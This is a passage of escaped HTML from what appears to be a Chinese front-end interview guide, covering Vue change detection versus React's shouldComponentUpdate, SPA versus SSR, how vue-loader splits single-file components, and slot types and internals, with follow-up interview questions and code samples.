可用数组提供多值兜底，浏览器采用其支持的最后一个值，不过 <code>Vue</code> 通常也会自动处理前缀。持续变化的内联样式仍要控制绑定范围，避免把稳定外观一并塞入。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_44-vue为什么没有类似于react中shouldcomponentupdate的生命周期\\"><a class=\\"header-anchor\\" href=\\"#_44-vue为什么没有类似于react中shouldcomponentupdate的生命周期\\">#</a> 44 Vue为什么没有类似于React中shouldComponentUpdate的生命周期</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>因为两者的更新粒度不同：<code>React</code> 默认<strong>父组件更新会重渲染整棵子树</strong>，所以需要 <code>shouldComponentUpdate</code>/<code>memo</code> 手动剪枝</li>\\n<li><code>Vue</code> 靠<strong>依赖收集</strong>精确知道每个组件依赖了哪些数据，数据变了只通知真正用到它的组件 —— 天然是精确更新</li>\\n<li>所以 <code>Vue</code> 里&quot;父组件重渲染导致子组件无谓重渲染&quot;这个问题本身就不太存在</li>\\n<li>代价是 <code>Vue</code> 需要维护响应式系统（每个属性一个 <code>Dep</code>），有内存和初始化开销</li>\\n<li><code>Vue</code> 仍有优化手段：<code>v-once</code>/<code>v-memo</code>、<code>computed</code> 缓存、以及把大组件拆小让更新范围更精确</li>\\n</ul>\\n<p><strong><code>Vue</code> 没有 <code>shouldComponentUpdate</code>，根本原因是它和 <code>React</code> 的变化侦测方式不同。</strong> <code>React</code> 发生更新后会通过虚拟 <code>DOM</code> 做差异检测，因此可用 <code>shouldComponentUpdate</code> 手动跳过确定不变的组件。<code>Vue</code> 借助响应式依赖收集，开始更新前通常已经知道哪个组件发生了变化，不太需要开发者手动控制。组件内部仍然会做 <code>diff</code>，但合理规模下额外优化的价值有限。</p>\\n</section>\\n<ul>\\n<li>考点: <code>Vue</code>的变化侦测原理</li>\\n<li>前置知识: 依赖收集、虚拟<code>DOM</code>、响应式系统</li>\\n</ul>\\n<blockquote>\\n<p>根本原因是<code>Vue</code>与<code>React</code>的变化侦测方式有所不同</p>\\n</blockquote>\\n<ul>\\n<li>当React知道发生变化后，会使用<code>Virtual Dom Diff</code>进行差异检测，但是很多组件实际上是肯定不会发生变化的，这个时候需要 <code>shouldComponentUpdate</code> 进行手动操作来减少<code>diff</code>，从而提高程序整体的性能</li>\\n<li><code>Vue</code>在一开始就知道那个组件发生了变化，不需要手动控制<code>diff</code>，而组件内部采用的<code>diff</code>方式实际上是可以引入类似于<code>shouldComponentUpdate</code>相关生命周期的，但是通常合理大小的组件不会有过量的diff，手动优化的价值有限，因此目前<code>Vue</code>并没有考虑引入<code>shouldComponentUpdate</code>这种手动优化的生命周期</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>一个 <code>React</code> 同事说 <code>Vue</code> 没有 <code>shouldComponentUpdate</code>，所以父组件状态变化时所有子组件都会完整 <code>diff</code>，你怎么反驳？</strong></p>\\n<p>这个推断忽略了两者的变化侦测方式：<code>Vue</code> 通过响应式依赖收集知道哪些组件受到了变化影响，并非默认让整棵子树都参与更新。<code>React</code> 得知状态变化后通常依赖虚拟 <code>DOM</code> 差异检测，才更需要用 <code>shouldComponentUpdate</code> 手动跳过确定不变的组件。<code>Vue</code> 组件内部仍会 <code>diff</code>，只是手动增加同类生命周期的收益通常有限。</p>\\n</li>\\n<li>\\n<p><strong>后台表格筛选条件变化时，只有统计栏读取了该条件，产品却要求给每个行组件加“是否更新”开关来提速，你会怎么处理？</strong></p>\\n<p>不应先给所有行组件设计手动更新开关，而应确认筛选条件实际被哪些组件和渲染过程依赖。<code>Vue</code> 的响应式系统会把变化通知到相关组件，合理拆分组件和依赖边界通常比人为维护跳过条件更稳。若统计栏内部自身渲染量过大，仍需优化其组件规模，因为精确定位更新不等于组件内部没有 <code>diff</code> 成本。</p>\\n</li>\\n<li>\\n<p><strong>一个组件从几十个节点膨胀到数千个节点后更新变慢，这是否证明 <code>Vue</code> 也必须提供 <code>shouldComponentUpdate</code>？</strong></p>\\n<p>不能据此推出必须增加该生命周期；<code>Vue</code> 能定位发生变化的组件，但该组件内部仍需完成必要的渲染和 <code>diff</code>。更直接的做法是拆分过大的组件，让依赖和更新范围更细，而不是加入容易漏更新的人工判断。只有组件内部存在大量确定不变内容时，手动跳过才可能有价值，来源并未表明 <code>Vue</code> 提供了该钩子。</p>\\n</li>\\n<li>\\n<p><strong>线上出现“数据已变但页面没变”，有人怀疑 <code>Vue</code> 自动跳过了组件更新，你会如何排查响应式链路？</strong></p>\\n<p>先检查模板或渲染函数是否真正读取了该响应式数据，再确认变更是否发生在 <code>Vue</code> 能侦测和追踪的链路中。<code>Vue</code> 的更新依据是依赖收集，不是开发者编写的 <code>shouldComponentUpdate</code> 返回值，因此重点应放在依赖是否建立、组件边界是否正确。若依赖已触发，再检查组件内部渲染结果和 <code>diff</code>，不能把所有未更新现象都归因于框架跳过。</p>\\n</li>\\n<li>\\n<p><strong>架构评审时有人要求 <code>Vue</code> 仿照 <code>React</code> 暴露 <code>shouldComponentUpdate</code>，另一方坚持完全禁止手动优化，你会如何权衡？</strong></p>\\n<p>默认不引入这种控制更符合 <code>Vue</code> 的变化侦测模型，因为框架已能定位受影响的组件，人工判断的常规收益有限。工程上先保持组件规模合理、依赖边界清晰，再用实际性能证据确认瓶颈是否来自组件内部过量 <code>diff</code>。强行维护跳过逻辑还可能漏掉合法更新，而完全忽视超大组件的内部成本同样不可取。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_45-spa、ssr的区别是什么\\"><a class=\\"header-anchor\\" href=\\"#_45-spa、ssr的区别是什么\\">#</a> 45 SPA、SSR的区别是什么</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>SPA</code>：一个 <code>HTML</code> 空壳 + <code>JS</code> 在客户端渲染，首屏要等 <code>JS</code> 下载执行，爬虫拿到的是空页面</li>\\n<li><code>SSR</code>：服务端渲染出完整 <code>HTML</code> 返回，浏览器直接显示，再水合接管交互</li>\\n<li><code>SSR</code> 改善的是 <strong><code>LCP</code>（首屏可见）和 <code>SEO</code></strong>，不改善 <code>INP</code>——水合仍要在客户端跑一遍</li>\\n<li><code>SSR</code> 的代价：服务端渲染成本和内存压力、代码要兼顾双端、部署运维更复杂</li>\\n<li>中间方案：预渲染（内容静态时最划算）、<code>ISR</code>（增量静态生成）、流式 <code>SSR</code></li>\\n</ul>\\n<p><strong><code>SPA</code> 主要在浏览器端生成页面内容，而 <code>SSR</code> 会先在服务端生成完整 <code>HTML</code> 再返回。</strong> <code>SPA</code> 首次加载后通常只请求数据，页面切换体验好、服务端压力较小，但首屏较慢且不利于 <code>SEO</code>。<code>SSR</code> 更适合有首屏和搜索收录要求的页面，代价是服务端开销、开发限制和部署复杂度都会增加。内容长期不变的站点，我会优先考虑预渲染或 <code>SSG</code>，避免每次请求都做服务端渲染。</p>\\n</section>\\n<p>我们现在编写的<code>Vue</code>、<code>React</code>和<code>Angular</code>应用大多数情况下都会在一个页面中，点击链接跳转页面通常是内容切换而非页面跳转，由于良好的用户体验逐渐成为主流的开发模式。但同时也会有首屏加载时间长，<code>SEO</code>不友好的问题，因此有了<code>SSR</code>，这也是为什么面试中会问到两者的区别</p>\\n<ol>\\n<li><code>SPA</code>（Single Page Application）即单页面应用。一般也称为 客户端渲染（Client Side Render）， 简称 <code>CSR</code>。<code>SSR</code>（Server Side Render）即 服务端渲染。一般也称为 多页面应用（Mulpile Page Application），简称 <code>MPA</code></li>\\n<li><code>SPA</code>应用只会首次请求<code>html</code>文件，后续只需要请求<code>JSON</code>数据即可，因此用户体验更好，节约流量，服务端压力也较小。但是首屏加载的时间会变长，而且<code>SEO</code>不友好。为了解决以上缺点，就有了<code>SSR</code>方案，由于<code>HTML</code>内容在服务器一次性生成出来，首屏加载快，搜索引擎也可以很方便的抓取页面信息。但同时SSR方案也会有性能，开发受限等问题</li>\\n<li>在选择上，如果我们的应用存在首屏加载优化需求，<code>SEO</code>需求时，就可以考虑<code>SSR</code></li>\\n<li>但并不是只有这一种替代方案，比如对一些不常变化的静态网站，SSR反而浪费资源，我们可以考虑预渲染（<code>prerender</code>）方案。另外<code>nuxt.js/next.js</code>中给我们提供了<code>SSG（Static Site Generate）</code>静态网站生成方案也是很好的静态站点解决方案，结合一些<code>CI</code>手段，可以起到很好的优化效果，且能节约服务器资源</li>\\n</ol>\\n<p><strong>内容生成上的区别：</strong></p>\\n<p>SSR</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/a3c8cf7c4b9b8825.png\\" alt=\\"\\"></p>\\n<p>SPA</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/46149f14f3674b16.png\\" alt=\\"\\"></p>\\n<p><strong>部署上的区别</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/e302c2f6998f2c7e.png\\" alt=\\"\\"></p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>内部审批系统只有登录用户访问，也没有搜索引擎收录要求，负责人却因为“首屏更快”坚持全面改成 <code>SSR</code>，你会支持吗？</strong></p>\\n<p>不会仅凭首屏诉求就全面改造，应先评估现有 <code>SPA</code> 的资源加载和接口瓶颈。<code>SPA</code> 首次获取 <code>HTML</code> 后主要请求 <code>JSON</code>，页面切换体验好、服务端压力较小；<code>SSR</code> 虽能直接输出页面内容，却会带来服务端性能和开发约束。没有 <code>SEO</code> 需求时，改造收益未必覆盖复杂度。</p>\\n</li>\\n<li>\\n<p><strong>新闻详情页要求搜索引擎直接抓到正文，而登录后的编辑后台仍强调顺滑切换，你会怎样划分渲染方案？</strong></p>\\n<p>公开详情页可优先考虑 <code>SSR</code>，由服务端生成含正文的 <code>HTML</code>，以改善首屏内容呈现和搜索抓取。编辑后台更适合保留 <code>SPA</code>，首次加载后通过 <code>JSON</code> 数据和客户端路由完成内容切换。两类页面目标不同，不必为了统一技术名义让全部页面承担同一种方案的代价。</p>\\n</li>\\n<li>\\n<p><strong>公司官网只有几十个基本不变的介绍页，运维担心每次访问都触发服务端渲染，你会在 <code>SSR</code> 与静态方案之间怎么选？</strong></p>\\n<p>这类低频变化的静态内容优先采用预渲染或 <code>SSG</code>，在构建阶段生成 <code>HTML</code>，再配合 <code>CI</code> 发布。它同样便于搜索引擎抓取，也避免每个请求都消耗服务端渲染资源。若内容后来需要按请求实时生成，才应重新评估 <code>SSR</code>，静态方案的代价是更新后需要重新构建和部署。</p>\\n</li>\\n<li>\\n<p><strong>一个 <code>SPA</code> 上线后首页长期白屏，但站内路由切换很快，搜索引擎也只能看到空壳 <code>HTML</code>，你怎么定位并解释？</strong></p>\\n<p>现象符合客户端渲染的典型边界：首次请求主要得到 <code>HTML</code> 外壳，还要等待脚本与数据后才能生成内容，因此首屏可能较慢。后续页面通常只请求 <code>JSON</code> 并在客户端切换，所以体验反而顺畅。若首页承担获客和搜索入口，可评估 <code>SSR</code>、预渲染或 <code>SSG</code>，但仍需先排除资源过大和接口缓慢。</p>\\n</li>\\n<li>\\n<p><strong>电商活动页既要求首屏和 <code>SEO</code>，又担心高流量下服务端压力，产品只允许在 <code>SPA</code> 与 <code>SSR</code> 中二选一，你会接受这个前提吗？</strong></p>\\n<p>不应把选择限制为纯 <code>SPA</code> 或每次请求都执行 <code>SSR</code>；若活动内容不常变化，预渲染或 <code>SSG</code> 更贴近约束。它们提前生成可抓取的 <code>HTML</code>，既改善首屏，也减少运行时服务端资源消耗。若页面必须按请求生成实时或个性化内容，静态方案才会失效，此时要承担 <code>SSR</code> 的性能与开发成本。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_46-vue-loader是什么-它有什么作用\\"><a class=\\"header-anchor\\" href=\\"#_46-vue-loader是什么-它有什么作用\\">#</a> 46 vue-loader是什么？它有什么作用？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>vue-loader</code> 是 <code>webpack</code> 的 loader，负责把 <code>.vue</code> 单文件组件拆开并分发给对应的 loader 处理</li>\\n<li>拆分三块：<code>&lt;template&gt;</code> → <code>vue-template-compiler</code> 编译成 <code>render</code> 函数；<code>&lt;script&gt;</code> → <code>babel</code>/<code>ts-loader</code>；<code>&lt;style&gt;</code> → <code>css-loader</code> 链</li>\\n<li><code>scoped</code> 的实现也在这里：给模板元素加 <code>data-v-xxx</code>，给样式选择器加对应的属性选择器</li>\\n<li>因为模板在<strong>构建期</strong>就编译好了，线上可以用体积更小的运行时版本 <code>Vue</code></li>\\n<li><code>Vite</code> 里对应的是 <code>@vitejs/plugin-vue</code>，做的事情一样但基于 <code>ESM</code> 和 <code>Rollup</code> 插件机制</li>\\n</ul>\\n<p><strong><code>vue-loader</code> 是处理 <code>Vue</code> 单文件组件的 <code>webpack loader</code>，负责解析并组装 <code>&lt;template&gt;</code>、<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。</strong> 它先把组件解析成描述信息，再为不同代码块生成独立请求，交给匹配的模板、脚本和样式处理链。这样项目可以在脚本中使用 <code>TS</code>、在样式中使用 <code>SASS</code>，模板也能选用其他预处理语言。对于模板编译和 <code>scoped</code> 样式，它还会注入额外处理，最后把各代码块装配成可用的组件模块。</p>\\n</section>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>vue-loader</code>是用于处理单文件组件（<code>SFC</code>，<code>Single-File Component</code>）的<code>webpack loader</code></li>\\n<li>因为有了<code>vue-loader</code>，我们就可以在项目中编写<code>SFC</code>格式的<code>Vue</code>组件，我们可以把代码分割为<code>&lt;template&gt;</code>、<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>，代码会异常清晰。结合其他<code>loader</code>我们还可以用<code>Pug</code>编写<code>&lt;template&gt;</code>，用<code>SASS</code>编写<code>&lt;style&gt;</code>，用<code>TS</code>编写<code>&lt;script&gt;</code>。我们的<code>&lt;style&gt;</code>还可以单独作用当前组件</li>\\n<li><code>webpack</code>打包时，会以<code>loader</code>的方式调用<code>vue-loader</code></li>\\n<li><code>vue-loader</code>被执行时，它会对<code>SFC</code>中的每个语言块用单独的<code>loader</code>链处理。最后将这些单独的块装配成最终的组件模块</li>\\n</ol>\\n<p><strong>原理</strong></p>\\n<p><code>vue-loader</code>会调用<code>@vue/compiler-sfc</code>模块解析<code>SFC</code>源码为一个描述符（<code>Descriptor</code>），然后为每个语言块生成<code>import</code>代码，返回的代码类似下面</p>\\n<pre class=\\"language-js\\"><code>// source.vue被vue-loader处理之后返回的代码\\n​\\n// import the &lt;template&gt; block\\nimport render from &#39;source.vue?vue&amp;type=template&#39;\\n// import the &lt;script&gt; block\\nimport script from &#39;source.vue?vue&amp;type=script&#39;\\nexport * from &#39;source.vue?vue&amp;type=script&#39;\\n// import &lt;style&gt; blocks\\nimport &#39;source.vue?vue&amp;type=style&amp;index=1&#39;\\n​\\nscript.render = render\\nexport default script\\n</code></pre>\\n<p>我们想要<code>script</code>块中的内容被作为<code>js</code>处理（当然如果是<code>&lt;script lang=&quot;ts&quot;&gt;</code>被作为<code>ts</code>理），这样我们想要<code>webpack</code>把配置中跟<code>.js</code>匹配的规则都应用到形如<code>source.vue?vue&amp;type=script</code>的这个请求上。例如我们对所有<code>*.js</code>配置了<code>babel-loader</code>，这个规则将被克隆并应用到所在<code>Vue SFC</code></p>\\n<pre class=\\"language-js\\"><code>import script from &#39;source.vue?vue&amp;type=script\\n</code></pre>\\n<p>将被展开为：</p>\\n<pre class=\\"language-js\\"><code>import script from &#39;babel-loader!vue-loader!source.vue?vue&amp;type=script&#39;\\n</code></pre>\\n<p>类似的，如果我们对<code>.sass</code>文件配置了<code>style-loader + css-loader + sass-loader</code>，对下面的代码</p>\\n<pre class=\\"language-text\\"><code>&lt;style scoped lang=&quot;scss&quot;&gt;\\n</code></pre>\\n<p><code>vue-loader</code>将会返回给我们下面结果：</p>\\n<pre class=\\"language-js\\"><code>import &#39;source.vue?vue&amp;type=style&amp;index=1&amp;scoped&amp;lang=scss&#39;\\n</code></pre>\\n<p>然后<code>webpack</code>会展开如下：</p>\\n<pre class=\\"language-js\\"><code>import &#39;style-loader!css-loader!sass-loader!vue-loader!source.vue?vue&amp;type=style&amp;index=1&amp;scoped&amp;lang=scss&#39;\\n</code></pre>\\n<ul>\\n<li>当处理展开请求时，<code>vue-loader</code>将被再次调用。这次，<code>loader</code>将会关注那些有查询串的请求，且仅针对特定块，它会选中特定块内部的内容并传递给后面匹配的<code>loader</code></li>\\n<li>对于<code>&lt;script&gt;</code>块，处理到这就可以了，但是<code>&lt;template&gt;</code> 和 <code>&lt;style&gt;</code>还有一些额外任务要做，比如\\n<ul>\\n<li>需要用 <code>Vue</code> 模板编译器编译<code>template</code>，从而得到<code>render</code>函数</li>\\n<li>需要对 <code>&lt;style scoped&gt;</code>中的<code>CSS</code>做后处理（<code>post-process</code>），该操作在<code>css-loader</code>之后但在<code>style-loader</code>之前</li>\\n</ul>\\n</li>\\n</ul>\\n<p>实现上这些附加的<code>loader</code>需要被注入到已经展开的<code>loader</code>链上，最终的请求会像下面这样：</p>\\n<pre class=\\"language-js\\"><code>// &lt;template lang=&quot;pug&quot;&gt;\\nimport &#39;vue-loader/template-loader!pug-loader!source.vue?vue&amp;type=template&#39;\\n​\\n// &lt;style scoped lang=&quot;scss&quot;&gt;\\nimport &#39;style-loader!vue-loader/style-post-loader!css-loader!sass-loader!vue-loader!source.vue?vue&amp;type=style&amp;index=1&amp;scoped&amp;lang=scss&#39;\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>有人说 <code>vue-loader</code> 只是把 <code>.vue</code> 后缀改成 <code>.js</code>，所以 <code>&lt;template&gt;</code>、<code>&lt;script lang=&quot;ts&quot;&gt;</code> 和 <code>&lt;style scoped lang=&quot;scss&quot;&gt;</code> 都由它独自编译，你怎么纠正？</strong></p>\\n<p><code>vue-loader</code> 的核心是解析并拆分 <code>SFC</code>，再为各语言块生成带查询参数的模块请求，最后装配为组件模块。<code>template</code> 还需模板编译器，<code>script lang=&quot;ts&quot;</code> 和 <code>style lang=&quot;scss&quot;</code> 会进入对应的 <code>loader</code> 链。它负责协调这些处理，而不是独自实现 <code>TypeScript</code>、<code>Sass</code> 和全部 <code>CSS</code> 转换。</p>\\n</li>\\n<li>\\n<p><strong>一个组件同时用了 <code>Pug</code>、<code>TypeScript</code> 和 <code>SCSS</code>，构建负责人问 <code>webpack</code> 为什么能给同一个 <code>.vue</code> 文件套三种处理链，你怎么解释？</strong></p>\\n<p><code>vue-loader</code> 先借助 <code>@vue/compiler-sfc</code> 把源码解析为描述符，再把各块转换成类似 <code>source.vue?vue&amp;type=script&amp;lang=ts</code> 的独立请求。<code>webpack</code> 会把匹配 <code>TypeScript</code>、<code>Pug</code> 或 <code>Sass</code> 的规则应用到相应请求，随后各块被重新装配。缺少任一对应 <code>loader</code> 时，该语言块仍会在构建阶段失败。</p>\\n</li>\\n<li>\\n<p><strong>团队把普通 <code>&lt;style&gt;</code> 改成 <code>&lt;style scoped lang=&quot;scss&quot;&gt;</code> 后，既要 <code>Sass</code> 编译又要样式隔离，<code>loader</code> 顺序里有什么额外约束？</strong></p>\\n<p>该样式块会先作为带 <code>type=style</code>、<code>scoped</code> 和 <code>lang=scss</code> 的请求进入展开后的处理链。除 <code>sass-loader</code>、<code>css-loader</code> 和 <code>style-loader</code> 外，<code>vue-loader</code> 还要注入样式后处理，使 <code>scoped</code> <code>CSS</code> 的处理发生在 <code>css-loader</code> 之后、<code>style-loader</code> 之前。顺序错误会让预处理或作用域转换失效。</p>\\n</li>\\n<li>\\n<p><strong><code>CI</code> 报错指向 <code>source.vue?vue&amp;type=script</code>，开发者却只查 <code>webpack</code> 的 <code>.vue</code> 规则，为什么可能一直找不到根因？</strong></p>\\n<p>带查询串的地址是 <code>vue-loader</code> 为 <code>SFC</code> 语言块生成的虚拟请求，不代表磁盘上存在同名文件。脚本块需要继续匹配 <code>JavaScript</code> 或 <code>TypeScript</code> 规则，例如原有的 <code>babel-loader</code> 规则会被克隆并应用。应沿完整 <code>loader</code> 链检查语言标记和匹配条件，而不是只验证最外层 <code>.vue</code> 规则。</p>\\n</li>\\n<li>\\n<p><strong>组件库想去掉 <code>vue-loader</code>，改成让浏览器直接运行仓库里的 <code>.vue</code> 文件，以减少构建配置，你会同意吗？</strong></p>\\n<p>常规 <code>webpack</code> 流程下不能直接去掉，因为浏览器并不认识由多个语言块组成的 <code>SFC</code>，模板也需要先编译成 <code>render</code> 函数。<code>vue-loader</code> 还承担拆块、调用相应处理链、装配组件以及 <code>scoped</code> 样式后处理等职责。除非换成具备等价 <code>SFC</code> 编译能力的工具链，否则只是把复杂度移走并导致构建失败。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_47-说说你对slot的理解-slot使用场景有哪些\\"><a class=\\"header-anchor\\" href=\\"#_47-说说你对slot的理解-slot使用场景有哪些\\">#</a> 47 说说你对slot的理解？slot使用场景有哪些</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>插槽是<strong>内容分发</strong>机制：让父组件决定子组件某个位置渲染什么，把&quot;结构&quot;和&quot;内容&quot;解耦</li>\\n<li>三种：默认插槽、具名插槽（<code>&lt;template #header&gt;</code>）、作用域插槽（子组件把数据抛给父组件的模板）</li>\\n<li>普通插槽在<strong>父组件作用域</strong>编译（访问不到子组件数据），作用域插槽编译成<strong>函数</strong>，子组件渲染时才调用并传参</li>\\n<li>典型场景：布局容器（<code>Layout</code> 的 header/sidebar/footer）、表格列自定义、弹窗的自定义内容、无渲染组件</li>\\n<li>判断信号：一个组件的 <code>props</code> 超过十几个，往往说明该用插槽把可变部分交出去</li>\\n</ul>\\n<p>**<code>slot</code> 是 <code>Vue</code> 的内容分发机制，让父组件把内容填到子组件预留的位置，从而把固定结构和可变内容解耦。**它分为默认插槽、具名插槽和作用域插槽，前两者解决内容放在哪里，作用域插槽还能把子组件数据传给父组件使用。本质上，插槽会被处理为返回 <code>VNode</code> 的函数，渲染时按名称取内容，没有传入时使用后备内容。它适合布局、表格列、下拉选和弹框等需要复用结构、局部定制内容的场景。</p>\\n</section>\\n<h3 id=\\"slot是什么\\"><a class=\\"header-anchor\\" href=\\"#slot是什么\\">#</a> slot是什么</h3>\\n<p>在HTML中 <code>slot</code> 元素 ，作为 <code>Web Components</code> 技术套件的一部分，是Web组件内的一个占位符</p>\\n<p>该占位符可以在后期使用自己的标记语言填充</p>\\n<p>举个栗子</p>\\n<pre class=\\"language-html\\"><code>&lt;template id=&quot;element-details-template&quot;&gt;\\n  &lt;slot name=&quot;element-name&quot;&gt;Slot template&lt;/slot&gt;\\n&lt;/template&gt;\\n&lt;element-details&gt;\\n  &lt;span slot=&quot;element-name&quot;&gt;1&lt;/span&gt;\\n&lt;/element-details&gt;\\n&lt;element-details&gt;\\n  &lt;span slot=&quot;element-name&quot;&gt;2&lt;/span&gt;\\n&lt;/element-details&gt;\\n</code></pre>\\n<p><code>template</code>不会展示到页面中，需要用先获取它的引用，然后添加到<code>DOM</code>中，</p>\\n<pre class=\\"language-js\\"><code>customElements.define(&#39;element-details&#39;,\\n  class extends HTMLElement {\\n    constructor() {\\n      super();\\n      const template = document\\n        .getElementById(&#39;element-details-template&#39;)\\n        .content;\\n      const shadowRoot = this.attachShadow({mode: &#39;open&#39;})\\n        .appendChild(template.cloneNode(true));\\n  }\\n})\\n</code></pre>\\n<p>在<code>Vue</code>中的概念也是如此</p>\\n<p><code>Slot</code> 艺名插槽，花名“占坑”，我们可以理解为<code>solt</code>在组件模板中占好了位置，当使用该组件标签时候，组件标签里面的内容就会自动填坑（替换组件模板中<code>slot</code>位置），作为承载分发内容的出口</p>\\n<h3 id=\\"slot使用场景\\"><a class=\\"header-anchor\\" href=\\"#slot使用场景\\">#</a> slot使用场景</h3>\\n<p>通过插槽可以让用户可以拓展组件，去更好地复用组件和对其做定制化处理</p>\\n<p>如果父组件在使用到一个复用组件的时候，获取这个组件在不同的地方有少量的更改，如果去重写组件是一件不明智的事情</p>\\n<p>通过<code>slot</code>插槽向组件内部指定位置传递内容，完成这个复用组件在不同场景的应用</p>\\n<p>比如布局组件、表格列、下拉选、弹框显示内容等</p>\\n<h3 id=\\"slot分类\\"><a class=\\"header-anchor\\" href=\\"#slot分类\\">#</a> slot分类</h3>\\n<p><code>slot</code>可以分来以下三种：</p>\\n<ul>\\n<li>默认插槽</li>\\n<li>具名插槽</li>\\n<li>作用域插槽</li>\\n</ul>\\n<p><strong>1. 默认插槽</strong></p>\\n<p>子组件用<code>&lt;slot&gt;</code>标签来确定渲染的位置，标签里面可以放<code>DOM</code>结构，当父组件使用的时候没有往插槽传入内容，标签内<code>DOM</code>结构就会显示在页面</p>\\n<p>父组件在使用的时候，直接在子组件的标签内写入内容即可</p>\\n<p>子组件<code>Child.vue</code></p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;slot&gt;\\n      &lt;p&gt;插槽后备的内容&lt;/p&gt;\\n    &lt;/slot&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p>父组件</p>\\n<pre class=\\"language-html\\"><code>&lt;Child&gt;\\n  &lt;div&gt;默认插槽&lt;/div&gt;  \\n&lt;/Child&gt;\\n</code></pre>\\n<p><strong>2. 具名插槽</strong></p>\\n<p>子组件用<code>name</code>属性来表示插槽的名字，不传为默认插槽</p>\\n<p>父组件中在使用时在默认插槽的基础上加上<code>slot</code>属性，值为子组件插槽<code>name</code>属性值</p>\\n<p>子组件<code>Child.vue</code></p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;slot&gt;插槽后备的内容&lt;/slot&gt;\\n  &lt;slot name=&quot;content&quot;&gt;插槽后备的内容&lt;/slot&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p>父组件</p>\\n<pre class=\\"language-html\\"><code>&lt;child&gt;\\n    &lt;template v-slot:default&gt;具名插槽&lt;/template&gt;\\n    &lt;!-- 具名插槽⽤插槽名做参数 --&gt;\\n    &lt;template v-slot:content&gt;内容...&lt;/template&gt;\\n&lt;/child&gt;\\n</code></pre>\\n<p><strong>3. 作用域插槽</strong></p>\\n<p>子组件在作用域上绑定属性来将子组件的信息传给父组件使用，这些属性会被挂在父组件<code>v-slot</code>接受的对象上</p>\\n<p>父组件中在使用时通过<code>v-slot:</code>（简写：#）获取子组件的信息，在内容中使用</p>\\n<p>子组件<code>Child.vue</code></p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt; \\n  &lt;slot name=&quot;footer&quot; testProps=&quot;子组件的值&quot;&gt;\\n          &lt;h3&gt;没传footer插槽&lt;/h3&gt;\\n    &lt;/slot&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p>父组件</p>\\n<pre class=\\"language-html\\"><code>&lt;child&gt; \\n    &lt;!-- 把v-slot的值指定为作⽤域上下⽂对象 --&gt;\\n    &lt;template v-slot:default=&quot;slotProps&quot;&gt;\\n      来⾃⼦组件数据：{{slotProps.testProps}}\\n    &lt;/template&gt;\\n    &lt;template #default=&quot;slotProps&quot;&gt;\\n      来⾃⼦组件数据：{{slotProps.testProps}}\\n    &lt;/template&gt;\\n&lt;/child&gt;\\n</code></pre>\\n<p><strong>小结：</strong></p>\\n<ul>\\n<li><code>v-slot</code>属性只能在<code>&lt;template&gt;</code>上使用，但在只有默认插槽时可以在组件标签上使用</li>\\n<li>默认插槽名为<code>default</code>，可以省略default直接写<code>v-slot</code></li>\\n<li>缩写为<code>#</code>时不能不写参数，写成<code>#default</code></li>\\n<li>可以通过解构获取<code>v-slot={user}</code>，还可以重命名<code>v-slot=&quot;{user: newName}&quot;</code>和定义默认值<code>v-slot=&quot;{user = \'默认值\'}&quot;</code></li>\\n</ul>\\n<h3 id=\\"slot原理分析\\"><a class=\\"header-anchor\\" href=\\"#slot原理分析\\">#</a> slot原理分析</h3>\\n<p><code>slot</code>本质上是返回<code>VNode</code>的函数，一般情况下，<code>Vue</code>中的组件要渲染到页面上需要经过<code>template -&gt; render function -&gt; VNode -&gt; DOM</code> 过程，这里看看<code>slot</code>如何实现：</p>\\n<p>编写一个<code>buttonCounter</code>组件，使用匿名插槽</p>\\n<pre class=\\"language-js\\"><code>Vue.component(&#39;button-counter&#39;, {\\n  template: &#39;&lt;div&gt; &lt;slot&gt;我是默认内容&lt;/slot&gt;&lt;/div&gt;&#39;\\n})\\n</code></pre>\\n<p>使用该组件</p>\\n<pre class=\\"language-js\\"><code>new Vue({\\n    el: &#39;#app&#39;,\\n    template: &#39;&lt;button-counter&gt;&lt;span&gt;我是slot传入内容&lt;/span&gt;&lt;/button-counter&gt;&#39;,\\n    components:{buttonCounter}\\n})\\n</code></pre>\\n<p>获取<code>buttonCounter</code>组件渲染函数</p>\\n<pre class=\\"language-js\\"><code>(function anonymous(\\n) {\\nwith(this){return _c(&#39;div&#39;,[_t(&quot;default&quot;,[_v(&quot;我是默认内容&quot;)])],2)}\\n})\\n</code></pre>\\n<p><code>_v</code>表示穿件普通文本节点，<code>_t</code>表示渲染插槽的函数</p>\\n<p>渲染插槽函数<code>renderSlot</code>（做了简化）</p>\\n<pre class=\\"language-js\\"><code>function renderSlot (\\n  name,\\n  fallback,\\n  props,\\n  bindObject\\n) {\\n  // 得到渲染插槽内容的函数    \\n  var scopedSlotFn = 